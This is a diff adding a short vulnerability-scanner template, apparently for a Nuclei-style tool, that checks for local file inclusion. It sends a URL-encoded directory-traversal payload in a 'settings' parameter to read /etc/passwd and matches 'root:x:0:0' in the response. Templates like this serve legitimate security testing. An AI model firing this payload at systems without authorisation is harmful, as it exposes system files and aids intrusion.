@@ -1,0 +1,20 @@
+id: lfi7-374
+name: 'Deep traversal in settings'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via settings'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      settings:
+        - '..%2f..%2f..%2f..%2fetc%2fpasswd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
